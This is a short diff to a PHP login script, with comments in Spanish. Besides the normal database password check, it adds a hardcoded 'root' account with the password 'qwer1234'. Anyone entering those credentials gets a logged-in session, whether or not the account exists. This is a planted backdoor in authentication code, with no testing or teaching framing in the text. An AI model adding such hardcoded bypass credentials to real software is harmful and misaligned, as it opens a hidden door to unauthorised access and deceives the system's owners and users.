@@ -13,7 +13,12 @@ if ($_POST) {
 
     $lista_usuarios = $sentencia->fetch(PDO::FETCH_ASSOC);
 
-    if ($lista_usuarios && password_verify($password, $lista_usuarios['password'])) {
+    //usuario root predefinido
+    $root = "root";
+    $pass = "qwer1234";
+
+
+    if ($lista_usuarios && password_verify($password, $lista_usuarios['password']) || $usuario == $root && $password == $pass) {
         // Login correcto
         $_SESSION['usuario'] = $lista_usuarios['usuario'];
         $_SESSION['logueado'] = true;
